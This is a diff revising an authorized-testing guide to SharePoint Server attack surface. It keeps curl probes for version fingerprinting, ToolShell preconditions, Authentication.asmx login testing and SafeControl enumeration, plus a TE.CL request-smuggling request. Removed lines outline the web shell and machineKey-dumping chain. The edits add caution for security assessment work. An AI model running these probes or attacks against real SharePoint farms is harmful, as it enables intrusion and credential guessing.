@@ -14,7 +14,7 @@ compatibility: Requires explicit written authorization for a target scope plus t
   relevant testing tools for this technique. Docs-only; helper scripts and commands
   not bundled.
 sources: github, authorized-engagement
-report_count: 1
+report_count: 1  # imported provenance metadata, not independently verified
 ---
 > **⚠️ AUTHORIZED USE ONLY**
 > This skill is for educational purposes or authorized security assessments only.
@@ -34,13 +34,13 @@ report_count: 1
 
 SharePoint Server (on-prem) is one of the richest enterprise attack surfaces in 2025-2026 bug bounty / red-team work. Three forces converge:
 
-1. **End-of-life unpatched code paths.** SharePoint Server 2013 reached extended-support EoL on 2023-04-11 (final build `15.0.5545.1000` / KB5002381). Every SharePoint CVE published after that date is **permanently unpatched** on SP2013 farms. SP2016 reaches EoL 2026-07-14; SP2019 reaches EoL 2026-07-14 (next 2 months as of May 2026); only SP Subscription Edition is currently in active support.
-2. **CVE-2025-53770 / 53771 "ToolShell"** — July 2025 emergency-out-of-band patch chain for SPE / SP2019 / SP2016. The vulnerable code path (anonymous `/_layouts/15/ToolPane.aspx?DisplayMode=Edit` + anonymous `__REQUESTDIGEST` + unencrypted ViewState) is present in **SP2013 too** and will never receive a fix.
-3. **Custom branded login pages forget legacy SOAP login.** `/_vti_bin/Authentication.asmx` with the `Login` SOAP op is the SharePoint equivalent of WordPress XMLRPC bypass — accepts native Forms credentials anonymously with no rate limit on most farms even when the branded UI has lockout.
+1. **Unsupported editions need migration and exposure controls.** Check Microsoft Lifecycle for the exact edition and current date; SharePoint 2013, 2016 and 2019 are outside extended support by October 2026. EoL does not imply every later SharePoint CVE applies to every edition.
+2. **ToolShell requires vendor-based exposure assessment.** Use the Microsoft CVE advisories, installed updates and farm configuration. Reachable ToolPane, FormDigest issuance, a blank `__VIEWSTATEENCRYPTED` field or HTTP 200 do not prove deserialization RCE or bypassed authorization.
+3. **Legacy authentication endpoints need independent control testing.** SOAP Mode=Forms indicates configuration, not an auth bypass. Use only owned test accounts and a pre-agreed low attempt limit; uniform failures do not prove unlimited guessing or absent account lockout/MFA.
 
 **Highest-value SharePoint targets:**
 
-- **SP2013 farms still on the public internet** — every CVE since April 2023 is unpatched. Critical-severity findings.
+- **SP2013 farms still on the public internet** — check actual affected code/patch exposure; do not assign critical severity from EoL alone.
 - **Dealer / partner / supplier portals** built on SharePoint by enterprise integrators (German VW group, a enterprise system integrator, etc.) — high-impact business data, often nested inside corporate AD trees.
 - **SharePoint farms with anonymous Forms-auth zones** — Authentication.asmx becomes anonymously brute-forceable.
 - **SharePoint inside corporate AD parent forests** — NTLM Type-2 leak (see `hunt-ntlm-info`) discloses the parent forest membership.
@@ -52,14 +52,14 @@ SharePoint Server (on-prem) is one of the richest enterprise attack surfaces in 
 
 ## Attack Surface Signals
 
-**Response-header fingerprints (any one is sufficient — usually multiple co-occur):**
+**Response-header fingerprints (correlate several; generic cookies, DAV and timing headers are not sufficient):**
 ```
 SPRequestGuid: <GUID>                           (always — anonymous and authenticated)
 X-MS-InvokeApp: 1; RequireReadOnly              (SharePoint web request)
 X-SharePointHealthScore: 0                      (SharePoint specific)
 SPIisLatency: <ms>                              (SharePoint internal timing)
 SPRequestDuration: <ms>                         (SharePoint request duration)
-MicrosoftSharePointTeamServices: 15.0.0.0      (often stripped by ELB — but if present, exact version)
+MicrosoftSharePointTeamServices: 15.0.0.0      (may be stripped or generic; not authoritative patch inventory)
 X-Forms_Based_Auth_Required: <login URL>        (Forms-auth zone indicator)
 X-Forms_Based_Auth_Return_Url: <return URL>     (Forms-auth zone indicator)
 X-MSDAVEXT_Error: 917656; Access denied...      (WebDAV extension active)
@@ -127,27 +127,21 @@ HelpWindowKey('WSSEndUser_troubleshooting                  (anonymous error.aspx
 
    ```bash
    # Method 1: _vti_inf.html (always anonymous, always present)
-   curl -sk "https://target.example/_vti_inf.html"
+   curl -sS --max-time 15 "https://target.example/_vti_inf.html"
    # → FPVersion="15.00.0.000" (15.x = SP2013, 16.x = SP2016/2019/SE)
 
    # Method 2: _api/contextinfo POST (anonymous on most farms)
-   curl -sk -X POST "https://target.example/_api/contextinfo" \
+   curl -sS --max-time 15 -X POST "https://target.example/_api/contextinfo" \
      -H "Accept: application/json;odata=verbose" \
      | jq -r '.d.GetContextWebInformation.LibraryVersion'
    # → "15.0.5545.1000" (full build number)
 
    # Method 3: /_layouts/15/start.aspx body
-   curl -sk "https://target.example/_layouts/15/start.aspx" \
+   curl -sS --max-time 15 "https://target.example/_layouts/15/start.aspx" \
      | grep -oE "15\.[0-9]+\.[0-9]+\.[0-9]+|16\.[0-9]+\.[0-9]+\.[0-9]+"
    ```
 
-   **Map to CVE matrix:**
-
-   | Build | Edition | Status | Notable unpatched-after-EoL CVEs |
-   |---|---|---|---|
-   | `15.0.5545.1000` | SP2013 final CU | **EoL 2023-04-11** | CVE-2023-29357, CVE-2023-33160/33157/36941, CVE-2024-21318/30043/38023/38024/38094, CVE-2025-53770/53771, CVE-2025-29794 |
-   | `16.0.10416.x` | SP2016 | EoL 2026-07-14 | depends on patch level |
-   | `16.0.10417.x+` | SP2019 / SE | active | check Microsoft's monthly Patch Tuesday |
+   **Map to vendor evidence:** request the owner's farm build and installed KB inventory, verify edition and patch prerequisites against Microsoft advisories, and record uncertainty. Header/LibraryVersion values alone may not identify installed security fixes.
 
 2. **Anonymous-endpoint matrix probe.** Walk every endpoint in the table below in one pass. Anything anonymous becomes part of the attack chain.
 
@@ -179,44 +173,42 @@ HelpWindowKey('WSSEndUser_troubleshooting                  (anonymous error.aspx
 
    ```bash
    # First: confirm Mode = Forms (else this attack vector is N/A)
-   curl -sk -X POST "https://target.example/_vti_bin/Authentication.asmx" \
+   curl -sS --max-time 15 -X POST "https://target.example/_vti_bin/Authentication.asmx" \
      -H "Content-Type: text/xml; charset=utf-8" \
      -H "SOAPAction: http://schemas.microsoft.com/sharepoint/soap/Mode" \
      -d '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Mode xmlns="http://schemas.microsoft.com/sharepoint/soap/" /></soap:Body></soap:Envelope>'
-   # → <ModeResult>Forms</ModeResult>  ← target is exploitable
+   # → <ModeResult>Forms</ModeResult>  ← forms-auth configuration only
    # → <ModeResult>Windows</ModeResult>  ← target uses Windows auth only; this vector N/A
 
    # Then: confirm no rate limit / no lockout (synthetic non-existent users ONLY)
    # Send 10 bursts at "burst-test-synthetic-zzz" with distinct wrong passwords
-   # If all 10 return 200 / 431 bytes / uniform timing → confirmed unlimited brute-force surface
+   # Uniform responses within this bounded test do not prove unlimited guessing or absent controls.
    ```
 
-   **Severity:** Critical when anonymous + no rate limit + no lockout. Submit as bug-bounty even before demonstrating successful auth — the *unbounded credential validation* is the bug, not "I cracked X credential."
+   **Assessment:** Report the actual limited test and controls observed; use a test account to distinguish account lockout from endpoint throttling when expressly authorized. Never infer account takeover or Critical severity solely from ten invalid-user attempts.
 
 4. **ToolShell precondition chain probe** (CVE-2025-53770 class). Three sub-requests:
 
    ```bash
    # Sub-step a: anonymous GET on ToolPane.aspx
-   curl -sk "https://target.example/_layouts/15/ToolPane.aspx?DisplayMode=Edit"
+   curl -sS --max-time 15 "https://target.example/_layouts/15/ToolPane.aspx?DisplayMode=Edit"
    # Body should contain: __REQUESTDIGEST="0x...,..."  AND  __VIEWSTATEENCRYPTED=""
    # If both: precondition stack is anonymous-reachable.
 
    # Sub-step b: anonymous POST to /_api/contextinfo
-   curl -sk -X POST "https://target.example/_api/contextinfo" \
+   curl -sS --max-time 15 -X POST "https://target.example/_api/contextinfo" \
      -H "Accept: application/json;odata=verbose" \
      | jq -r '.d.GetContextWebInformation.FormDigestValue'
    # Should return a valid digest with 1800s validity.
 
    # Sub-step c: anonymous POST to ToolPane.aspx with that digest as X-RequestDigest
-   curl -sk -X POST "https://target.example/_layouts/15/ToolPane.aspx?DisplayMode=Edit" \
+   curl -sS --max-time 15 -X POST "https://target.example/_layouts/15/ToolPane.aspx?DisplayMode=Edit" \
      -H "X-RequestDigest: <digest from step b>" \
      --data "MSOSPWebPartManager_DisplayModeName=Browse&MSOTlPn_Button=none"
    # Should return 200 OK — server treats anonymous-with-digest as authorised state-changing POST.
    ```
 
-   **Severity:** Critical on EoL SP2013 (no patch will ever ship). High on SP2016/2019/SE if `__VIEWSTATEENCRYPTED` is non-empty (encrypted ViewState mitigates the deserialization arm but precondition still warns of misconfig).
-
-   **IMPORTANT:** Do NOT actually deliver a malicious ViewState payload. The precondition chain is sufficient evidence for the report. In the real CVE-2025-53770 chain, machineKey recovery is NOT a precondition for RCE: the auth-bypass (CVE-2025-49706, crafted Referer to ToolPane.aspx) + insecure deserialization (CVE-2025-49704) yield an initial web shell with no machineKey knowledge. The `<machineKey>` (ValidationKey/DecryptionKey) is then DUMPED by that web shell and used to forge signed `__VIEWSTATE` for persistent/unauthenticated re-exploitation. So machineKey is the loot of the first RCE and the persistence arm, not a gate in front of it — do not under-assess an exploitable farm just because machineKey is unknown.
+   **Assessment:** These requests establish only endpoint behavior. Blank ViewState-related markup does not establish encryption/signature state or a usable gadget; FormDigest is a request-validation token, not authentication. Do not label this chain RCE without independent vendor/build evidence or an approved controlled reproduction. Do not deliver malicious ViewState, install a webshell or dump machine keys as routine validation. Owners should follow the vendor update, key-rotation and compromise-investigation guidance.
 
 5. **NTLM Type-2 AD topology disclosure.** Cross-reference `hunt-ntlm-info` for full methodology. Quick check:
 
@@ -227,7 +219,7 @@ HelpWindowKey('WSSEndUser_troubleshooting                  (anonymous error.aspx
    # Decode the Type-2 challenge → leaks NetBIOS domain, DNS forest, computer name
    ```
 
-   **Severity:** Medium when chained with internet exposure + default `WIN-XXXXXXXXXXX` hostname; Informational otherwise.
+   **Assessment:** Record disclosed fields and actual boundary impact; hostname format alone does not establish severity.
 
 6. **SafeControl enumeration via Picker.aspx.** Picker.aspx differentiates two error states by class existence:
    - Type EXISTS but not whitelisted: `"Only PickerDialog types can be used with the dialog. The type should be configured as a safecontrol in this site."`
@@ -241,7 +233,7 @@ HelpWindowKey('WSSEndUser_troubleshooting                  (anonymous error.aspx
      "Microsoft.SharePoint.WebControls.ItemPicker" \
      "Microsoft.SharePoint.WebPartPages.DataFormWebPart" \
      ; do
-     curl -sk "https://target.example/_layouts/15/Picker.aspx?PickerDialogType=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "$cls")&typeName=System.String" \
+     curl -sS --max-time 15 "https://target.example/_layouts/15/Picker.aspx?PickerDialogType=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "$cls")&typeName=System.String" \
        | grep -oE "<title>[^<]+</title>"
    done
    ```
@@ -252,7 +244,7 @@ HelpWindowKey('WSSEndUser_troubleshooting                  (anonymous error.aspx
    - Files matching the extension blocklist (`.ashx`, `.asmx`, `.svc`, `.config`) → 500 with `"file blocked from this Web site by the server administrators"` regardless of whether the file exists.
    - `file://`, UNC paths, `gopher://`, etc. → 500 with `"Value does not fall within the expected range"` — URL-scheme validator rejects.
 
-   **The error-message URL echo is NOT confirmation of SSRF.** Confirm via Burp Collaborator OOB before claiming. (Cross-reference `hunt-ssrf` OOB-Or-It-Didn't-Happen Gate.) Verified negative in authorized engagement: 38 Collaborator-tagged payloads across 12+ URL-accepting SP parameters → zero callbacks.
+   **The error-message URL echo is NOT confirmation of SSRF.** Confirm via Burp Collaborator OOB before claiming. (Cross-reference `hunt-ssrf` OOB-Or-It-Didn't-Happen Gate.) Imported engagement observations are unverified here; no callback is inconclusive when egress/DNS is blocked.
 
    The extension blocklist also looks like a "file-existence oracle" (existing vs not-found returns different responses) but it's actually just the SP file-extension policy. Don't infer file presence from the blocklist response.
 
@@ -260,9 +252,9 @@ HelpWindowKey('WSSEndUser_troubleshooting                  (anonymous error.aspx
 
    ```bash
    for sub in pages Pages js Js JS css scripts handlers controls images config data services api; do
-     curl -sk -o /dev/null -w "%{http_code} %{size_download}\n" \
+     curl -sS --max-time 15 -o /dev/null -w "%{http_code} %{size_download}\n" \
        "https://target.example/_layouts/15/CustomerName/$sub/"
-     # 301/302 with auth-redirect = directory exists; 404 = missing; 403 = directory listing blocked but path valid
+     # Status codes can come from wildcard routes/auth/WAF; compare random non-existent paths before inferring existence.
    done
    ```
 
@@ -288,7 +280,7 @@ POST /_vti_bin/Authentication.asmx HTTP/1.1
 Host: target.example
 Content-Type: text/xml; charset=utf-8
 SOAPAction: http://schemas.microsoft.com/sharepoint/soap/Login
-Content-Length: 376
+Content-Length: <computed-byte-length>
 
 <?xml version="1.0" encoding="utf-8"?>
 <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
@@ -308,24 +300,24 @@ Response codes:
 **ToolShell precondition reproduction:**
 ```bash
 # Step 1: anon GET ToolPane.aspx
-TP=$(curl -sk "https://target.example/_layouts/15/ToolPane.aspx?DisplayMode=Edit")
+TP=$(curl -sS --max-time 15 "https://target.example/_layouts/15/ToolPane.aspx?DisplayMode=Edit")
 echo "$TP" | grep -oE '__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="[^"]*"'
 # If value="" → precondition
 
 # Step 2: anon FormDigest
-DIGEST=$(curl -sk -X POST "https://target.example/_api/contextinfo" \
+DIGEST=$(curl -sS --max-time 15 -X POST "https://target.example/_api/contextinfo" \
   -H "Accept: application/json;odata=verbose" \
   | jq -r '.d.GetContextWebInformation.FormDigestValue')
 echo "Digest: ${DIGEST:0:40}..."
 
 # Step 3: anon POST ToolPane with digest
-curl -sk -X POST -H "X-RequestDigest: $DIGEST" \
+curl -sS --max-time 15 -X POST -H "X-RequestDigest: $DIGEST" \
   --data "MSOSPWebPartManager_DisplayModeName=Browse&MSOTlPn_Button=none" \
   "https://target.example/_layouts/15/ToolPane.aspx?DisplayMode=Edit" \
   -w "\ncode=%{http_code} size=%{size_download}\n"
 ```
 
-**HTTP TE.CL smuggling on AWS ELB + SP IIS back-end** (consistent on SP farms behind AWS ELB):
+**Historical TE.CL framing sketch (not a validated exploit or all-ELB behavior):**
 ```
 POST /_layouts/15/blank.htm HTTP/1.1
 Host: target.example
@@ -341,11 +333,11 @@ x=1
 0
 
 ```
-Expected back-end hang: ~12 s vs ~0.16 s baseline (consistent across 5 trials). Obfuscation variants (`Transfer-Encoding : chunked`, `transfer-encoding: chunked`, trailing-space, mixed-case) produce a similar ~6 s hang.
+Historical timing claims are not independently verified. Timeouts alone do not prove desynchronization; framing lengths must be computed from actual bytes, and any differential testing must use isolated connections with a stop condition to avoid affecting other users.
 
 **Picker.aspx SafeControl recon:**
 ```bash
-curl -sk "https://target.example/_layouts/15/Picker.aspx?PickerDialogType=Microsoft.SharePoint.WebPartPages.DataFormWebPart&typeName=System.String" \
+curl -sS --max-time 15 "https://target.example/_layouts/15/Picker.aspx?PickerDialogType=Microsoft.SharePoint.WebPartPages.DataFormWebPart&typeName=System.String" \
   | grep -oE "<title>[^<]+</title>"
 # "Only PickerDialog types..." = exists, not whitelisted
 # "Could not load type..."    = does not exist
@@ -363,21 +355,23 @@ curl -sk "https://target.example/_layouts/15/Picker.aspx?PickerDialogType=Micros
 
 4. **NTLM enabled on public-zone IIS binding.** Default dual-auth (Forms + NTLM) leaves NTLM Negotiate available to anonymous internet users. Type-2 challenge leaks AD topology.
 
-5. **SP2013 farms past EoL still internet-exposed.** Microsoft extended support ended 2023-04-11. Every post-April-2023 SharePoint CVE is unpatched. Common in enterprise integrator scenarios (system-integrator inside corporate-parent AD, SI-managed dealer portals).
+5. **SP2013 farms past EoL still internet-exposed.** Microsoft extended support ended 2023-04-11. CVE applicability still requires edition-specific verification. Common in enterprise integrator scenarios (system-integrator inside corporate-parent AD, SI-managed dealer portals).
 
 6. **`<SafeControl>` whitelist in web.config trusted as the only gate.** Picker.aspx enforces an `instanceof PickerDialog` check, which is patched against the original CVE-2019-0604 vector — but the underlying SafeControl model itself is anonymously enumerable via the Picker.aspx error differential.
 
 7. **AWS ELB + SP IIS without explicit Transfer-Encoding normalization.** Default ELB forwards `Transfer-Encoding` to back-end IIS; IIS interprets `Content-Length` when both are present in a way that desyncs from ELB. Multiple TE-obfuscation variants bypass simple WAF rules.
 
-8. **Default Windows-installer hostname (`WIN-XXXXXXXXXXX`) never renamed.** Signal of rushed provisioning; correlates with default service-account passwords on SQL backend, default farm-account passwords on Central Admin, etc.
+8. **Default Windows-installer hostname (`WIN-XXXXXXXXXXX`) never renamed.** Hostname naming alone says nothing reliable about passwords or patch management.
 
-9. **Custom-branding module (`/_layouts/15/<Customer>/`) JS bundles loaded with `?v=YYYYMMDD` query strings.** The query string reveals last-modified date — useful for "this app is actively maintained" vs "this app is abandoned" determination.
+9. **Custom-branding module (`/_layouts/15/<Customer>/`) JS bundles loaded with `?v=YYYYMMDD` query strings.** The query string may be a cache-busting/build value, not a last-modified date — useful for "this app is actively maintained" vs "this app is abandoned" determination.
 
 10. **Cross-node ViewState MAC failures when AWS ELB doesn't pin session affinity to one WFE.** Operationally broken (users hit 500s on every POST); security-wise broadcasts farm topology in error messages.
 
 ---
 
-## Bypass Techniques
+## Historical Bypass Hypotheses
+
+Entries are leads, not demonstrated bypasses. Authentication controls depend on zone/provider, FormDigest does not grant authentication, request validation is not an XSS/RCE boundary, and an error differential does not prove a patch or its absence. No cross-service escalation or account spraying is authorized by this table.
 
 | Defense | Bypass / Recon Strategy |
 |---|---|
@@ -397,28 +391,19 @@ curl -sk "https://target.example/_layouts/15/Picker.aspx?PickerDialogType=Micros
 
 ## Gate 0 Validation
 
-Before writing the report:
-
-1. **What can the attacker DO right now?**
-   - Authentication.asmx anonymous + no rate limit → **Critical** (unbounded credential validation; password spray + UPN format from NTLM = end-to-end ATO path)
-   - Full ToolShell precondition chain (anon GET + anon FormDigest + anon POST + unencrypted VS) + EoL SP2013 → **Critical** (RCE via well-documented public exploit chain, no patch will ship)
-   - NTLM Type-2 AD topology disclosure + default-Windows hostname → **Medium**
-   - SP2013 EoL alone → **Medium-Low** (compliance / hygiene; bug-bounty programs vary — some accept, many reject)
-   - `download.aspx` URL echo without confirmed Collaborator callback → **NOT SSRF — retract**
-
-2. **Have you reproduced the full chain to attacker-attainable impact?**
-   - For Authentication.asmx: 10-burst test with uniform timing (proves no rate limit) is sufficient. Don't actually crack a credential.
-   - For ToolShell: precondition chain (steps a+b+c) is sufficient. Don't deliver a malicious payload.
-   - For NTLM: AV-pair decode showing AD-topology fields is sufficient.
-
-3. **Can you reproduce in <10 minutes from a clean shell?**
-   - Authentication.asmx: 2 curl commands.
-   - ToolShell precondition: 3 curl commands.
-   - NTLM Type-2: 1 Python snippet (the AV-pair decoder).
+Report only reproducible observations, edition/build evidence and actual impact.
+A finite failed-login burst is not unlimited brute force, endpoint markup is not
+RCE, and a timeout is not request smuggling. Preserve negative controls, exact
+requests/responses and scope. Do not retrieve customer documents, credentials or
+machine keys, spray real accounts, pivot into Entra/AD, or install persistence.
+If more impact proof is required, agree a lab/canary plan with the owner first.
+Severity and bounty eligibility follow the program's policy and verified impact.
 
 ---
 
-## Real Impact Examples
+## Historical Imported Engagement Narrative
+
+The following original narrative is not independently verified evidence. Its counts, severity ratings, zero-day assertion, timing-only smuggling inference, ToolShell-precondition inference and patch verification claim must not be reused as findings. Retained for provenance of the imported source; the validation rules above supersede those conclusions.
 
 ### Scenario A — a authorized SharePoint engagement against an EoL on-prem farm
 
@@ -441,6 +426,11 @@ Same target. Initial scan flagged `download.aspx?SourceUrl=http://oob.example.co
 Same target. Feeding `Microsoft.SharePoint.WebPartPages.DataFormWebPart` (the canonical CVE-2019-0604 deserialization gadget) to Picker.aspx returned `"Only PickerDialog types can be used with the dialog. The type should be configured as a safecontrol in this site."` — meaning the type EXISTS and is reachable through reflection, but the dialog framework's `instanceof PickerDialog` patch correctly rejects it. The patch IS in place for the original CVE-2019-0604 vector. The class-existence enumeration itself becomes recon for any future CVE-2019-0604-family chain that doesn't go through the inheritance gate.
 
 ---
+
+## Vendor Sources
+
+- [Microsoft ToolShell guidance](https://www.microsoft.com/en-us/msrc/blog/2025/07/customer-guidance-for-sharepoint-vulnerability-cve-2025-53770)
+- [SharePoint 2019 lifecycle](https://learn.microsoft.com/lifecycle/products/sharepoint-server-2019)
 
 ## Cross-references
 
